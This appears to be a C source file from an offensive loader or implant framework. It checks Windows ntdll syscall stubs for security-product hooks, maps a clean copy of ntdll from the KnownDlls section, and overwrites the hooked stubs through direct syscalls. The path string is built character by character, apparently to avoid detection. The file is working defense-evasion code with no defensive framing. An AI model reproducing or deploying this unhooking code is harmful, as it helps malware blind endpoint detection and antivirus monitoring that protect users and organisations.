#include "NtdllRefresh.h"
#include "Syscalls.h"
#include "ProcLoader.h"
#include "utils.h"
#include "ntdll.h"

#define NTDLL_STUB_SIZE 32

BOOL IsNtStubHooked(PVOID pFunc)
{
    if (!pFunc)
        return FALSE;

    BYTE* p = (BYTE*)pFunc;

#ifdef __x86_64__
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        if (p[6] == 0x00 && p[7] == 0x00)
            return FALSE;
    }
    return TRUE;
#else
    if (p[0] == 0xB8 && p[3] == 0x00 && p[4] == 0x00)
        return FALSE;
    return TRUE;
#endif
}

#ifdef __x86_64__

static PVOID MapCleanNtdll()
{
    WCHAR path[32];
    path[0]  = L'\\'; path[1]  = L'K'; path[2]  = L'n'; path[3]  = L'o';
    path[4]  = L'w'; path[5]  = L'n'; path[6]  = L'D'; path[7]  = L'l';
    path[8]  = L'l'; path[9]  = L's'; path[10] = L'\\'; path[11] = L'n';
    path[12] = L't'; path[13] = L'd'; path[14] = L'l'; path[15] = L'l';
    path[16] = L'.'; path[17] = L'd'; path[18] = L'l'; path[19] = L'l';
    path[20] = L'\0';

    UNICODE_STRING us;
    us.Buffer        = path;
    us.Length         = 20 * sizeof(WCHAR);
    us.MaximumLength = 21 * sizeof(WCHAR);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hSection = NULL;
    NTSTATUS status = SysNtOpenSection(&hSection, SECTION_MAP_READ, &oa);
    if (!NT_SUCCESS(status))
        return NULL;

    PVOID  baseAddr = NULL;
    SIZE_T viewSize = 0;
    status = SysNtMapViewOfSection(hSection, NtCurrentProcess(), &baseAddr,
        0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY);

    SysNtClose(hSection);

    if (!NT_SUCCESS(status))
        return NULL;

    return baseAddr;
}

static ULONG GetFunctionRva(HMODULE hModule, PVOID pFunc)
{
    return (ULONG)((BYTE*)pFunc - (BYTE*)hModule);
}

BOOL RefreshNtdllStub(PVOID pFunc)
{
    if (!pFunc)
        return FALSE;

    HMODULE ntdll = SysModules->Ntdll;
    ULONG funcRva = GetFunctionRva(ntdll, pFunc);

    PVOID cleanNtdll = MapCleanNtdll();
    if (!cleanNtdll)
        return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)cleanNtdll + dos->e_lfanew);

    if (funcRva >= nt->OptionalHeader.SizeOfImage) {
        SysNtUnmapViewOfSection(NtCurrentProcess(), cleanNtdll);
        return FALSE;
    }

    PVOID  cleanStub = (BYTE*)cleanNtdll + funcRva;
    PVOID  addr      = pFunc;
    SIZE_T size      = NTDLL_STUB_SIZE;
    ULONG  oldProtect = 0;

    NTSTATUS status = SysNtProtectVirtualMemory(NtCurrentProcess(), &addr, &size,
        PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!NT_SUCCESS(status)) {
        SysNtUnmapViewOfSection(NtCurrentProcess(), cleanNtdll);
        return FALSE;
    }

    memcpy(pFunc, cleanStub, NTDLL_STUB_SIZE);

    addr = pFunc;
    size = NTDLL_STUB_SIZE;
    SysNtProtectVirtualMemory(NtCurrentProcess(), &addr, &size, oldProtect, &oldProtect);

    SysNtUnmapViewOfSection(NtCurrentProcess(), cleanNtdll);
    return TRUE;
}

#else

BOOL RefreshNtdllStub(PVOID pFunc)
{
    (void)pFunc;
    return FALSE;
}

#endif
